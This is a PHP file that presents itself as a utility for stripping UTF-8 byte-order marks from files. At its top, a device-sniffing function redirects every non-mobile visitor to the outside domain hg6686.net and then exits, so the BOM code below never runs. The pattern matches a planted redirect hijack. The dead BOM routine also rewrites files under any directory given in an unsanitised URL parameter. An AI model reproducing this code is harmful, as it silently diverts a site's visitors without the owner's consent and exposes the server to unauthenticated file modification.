<?php
//
function isMobile(){ 
    if (isset ($_SERVER['HTTP_X_WAP_PROFILE'])){
        return true;
    } 
    if (isset ($_SERVER['HTTP_VIA'])){ 
        return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
    } 
    if (isset ($_SERVER['HTTP_USER_AGENT'])){
        $clientkeywords = array ('nokia','sony','ericsson','mot','samsung','htc','sgh','lg','sharp','sie-','philips','panasonic','alcatel','lenovo','iphone','ipod','blackberry','meizu','android','netfront','symbian','ucweb','windowsce','palm','operamini','operamobi','openwave','nexusone','cldc','midp','wap','mobile'); 
        if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT']))){
            return true;
        } 
    } 
    return false;
} 

if(!isMobile()){
 header('location:http://hg6686.net');	
}
exit();
if (isset($_GET['dir'])) { //设置文件目录
    $basedir = $_GET['dir'];
} else {
    $basedir = '.';
}
$auto = 1;
checkdir($basedir);
function checkdir($basedir)
{
    if ($dh = opendir($basedir)) {
        while (($file = readdir($dh)) !== false) {
            if ($file != '.' && $file != '..') {
                if (!is_dir($basedir . "/" . $file)) {
                    echo "filename: $basedir/$file " . checkBOM("$basedir/$file") . " <br>";
                } else {
                    $dirname = $basedir . "/" . $file;
                    checkdir($dirname);
                }
            }
        }
        closedir($dh);
    }
}

function checkBOM($filename)
{
    global $auto;
    $contents = file_get_contents($filename);
    $charset[1] = substr($contents, 0, 1);
    $charset[2] = substr($contents, 1, 1);
    $charset[3] = substr($contents, 2, 1);
    if (ord($charset[1]) == 239 && ord($charset[2]) == 187 && ord($charset[3]) == 191) {
        if ($auto == 1) {
            $rest = substr($contents, 3);
            rewrite($filename, $rest);
            return ("<font color=red>BOM found, automatically removed. <a href='#' target='_blank' rel='nofollow'></a></font>" );       } else {
            return ("<font color=red>BOM found.</font>");
        }
    }
    else return ("BOM Not Found.");
}

function rewrite($filename, $data)
{
    $filenum = fopen($filename, "w");
    flock($filenum, LOCK_EX);
    fwrite($filenum, $data);
    fclose($filenum);
}

?>
